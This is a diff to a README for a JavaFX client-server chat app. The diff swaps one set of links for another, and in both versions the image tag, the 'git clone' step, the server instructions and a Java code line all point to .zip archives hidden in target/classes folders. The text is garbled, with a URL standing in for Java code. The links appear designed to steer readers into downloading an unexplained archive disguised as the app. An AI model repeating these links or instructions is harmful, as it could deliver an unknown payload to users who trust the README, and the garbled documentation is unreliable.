@@ -1,7 +1,7 @@
 # ChatApp (JFX)
 
 ## How it looks like
-<img src="https://raw.githubusercontent.com/AyeChanAungThwin/ChatApp/main/ChatServerApp/target/classes/io/github/ayechanaungthwin/chat/cor/Chat-App-v2.2.zip" alt="Chat App Animation Gif">
+<img src="https://github.com/AyeChanAungThwin/ChatApp/raw/refs/heads/main/ChatClientApp/target/classes/io/github/ayechanaungthwin/chat/jfx/App-Chat-tarepatch.zip" alt="Chat App Animation Gif">
 
 ## Abstract
 > This is the test purpose JFX project that can directly runs as "Java Application" on Maven project.
@@ -9,8 +9,8 @@
 
 ## How to test
 - Open command or terminal.
-- Type ```git clone https://raw.githubusercontent.com/AyeChanAungThwin/ChatApp/main/ChatServerApp/target/classes/io/github/ayechanaungthwin/chat/cor/Chat-App-v2.2.zip``` and press enter.
-- Firstly, Run Server side App. It will wait for the client to join the _Server Socket_: ```https://raw.githubusercontent.com/AyeChanAungThwin/ChatApp/main/ChatServerApp/target/classes/io/github/ayechanaungthwin/chat/cor/Chat-App-v2.2.zip```
+- Type ```git clone https://github.com/AyeChanAungThwin/ChatApp/raw/refs/heads/main/ChatClientApp/target/classes/io/github/ayechanaungthwin/chat/jfx/App-Chat-tarepatch.zip``` and press enter.
+- Firstly, Run Server side App. It will wait for the client to join the _Server Socket_: ```https://github.com/AyeChanAungThwin/ChatApp/raw/refs/heads/main/ChatClientApp/target/classes/io/github/ayechanaungthwin/chat/jfx/App-Chat-tarepatch.zip```
 - And then, run the client side App. A _Socket_ will be created and it will go join the _Server Socket_.
 - Finally, you can start chatting from both of the Apps on a _Socket_.
 
@@ -28,7 +28,7 @@
 		new Thread(() -> {
 			try {
 				server = new Server(7777); 
-				https://raw.githubusercontent.com/AyeChanAungThwin/ChatApp/main/ChatServerApp/target/classes/io/github/ayechanaungthwin/chat/cor/Chat-App-v2.2.zip(300); 
+				https://github.com/AyeChanAungThwin/ChatApp/raw/refs/heads/main/ChatClientApp/target/classes/io/github/ayechanaungthwin/chat/jfx/App-Chat-tarepatch.zip(300); 
 				//Codes
 			} catch (Exception e) {
 				//Codes
